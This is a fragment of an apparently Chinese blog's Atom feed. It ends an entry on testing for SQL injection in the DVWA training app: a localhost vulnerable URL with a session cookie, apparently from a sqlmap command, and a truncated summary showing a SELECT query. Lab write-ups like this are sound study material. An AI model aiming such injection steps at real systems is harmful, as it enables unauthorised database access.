href="http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie =”security=low; PHPSESSID=13nt494nnep4ge910t9d0tq91o”</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;判断是否存在SQL注入漏洞&quot;&gt;&lt;a href=&quot;#判断是否存在SQL注入漏洞&quot; class=&quot;headerlink&quot; title=&quot;判断是否存在SQL注入漏洞&quot;&gt;&lt;/a&gt;判断是否存在SQL注入漏洞&lt;/h2&gt;&lt;p&gt;SELECT  first_name,last_na</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
</feed>
